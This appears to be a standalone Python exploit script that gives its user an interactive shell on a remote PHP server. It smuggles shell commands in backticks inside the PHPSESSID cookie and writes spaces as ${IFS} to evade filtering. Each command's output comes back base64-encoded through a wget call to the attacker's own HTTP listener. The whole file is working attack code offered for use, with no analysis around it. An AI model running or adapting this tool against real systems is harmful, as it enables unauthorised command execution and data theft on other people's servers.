#!/usr/bin/env python
import base64
import requests
import _thread
from http.server import BaseHTTPRequestHandler, HTTPServer

LOCAL_HOST = "127.0.0.1"
LOCAL_PORT = 4444
REMOTE_HOST = "127.0.0.1"

class CustomHandler(BaseHTTPRequestHandler):
	def do_GET(self):
		print(base64.b64decode(self.path[1:]).decode())
		self.send_response(200)
		self.send_header('Content-type','text/html')
		self.end_headers()
		self.wfile.write(b"Hello World !")
		getCommand()
		return


def getCommand():
	t = _thread.start_new_thread(run, ())

def run():
	command = input("$ ").replace(" ", "${IFS}")
	requests.get("http://{REMOTE_HOST}/".format(REMOTE_HOST=REMOTE_HOST), cookies={"PHPSESSID":"`wget${{IFS}}{LOCAL_HOST}:{LOCAL_PORT}/$({command}|base64${{IFS}}-w${{IFS}}0)`".format(LOCAL_HOST=LOCAL_HOST, LOCAL_PORT=LOCAL_PORT, command=command)})

def startServer():
	try:
		server = HTTPServer(('', LOCAL_PORT), CustomHandler)
		server.serve_forever()

	except KeyboardInterrupt:
		server.socket.close()

if __name__=='__main__':
	import argparse
	parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
	parser.add_argument(metavar="local_host", dest="localHost", type=str)
	parser.add_argument(metavar="local_port", dest="localPort", type=int)
	parser.add_argument(metavar="remote_host", dest="remoteHost", type=str)
	args = parser.parse_args()

	LOCAL_HOST = args.localHost
	LOCAL_PORT = args.localPort
	REMOTE_HOST = args.remoteHost

	getCommand()
	startServer()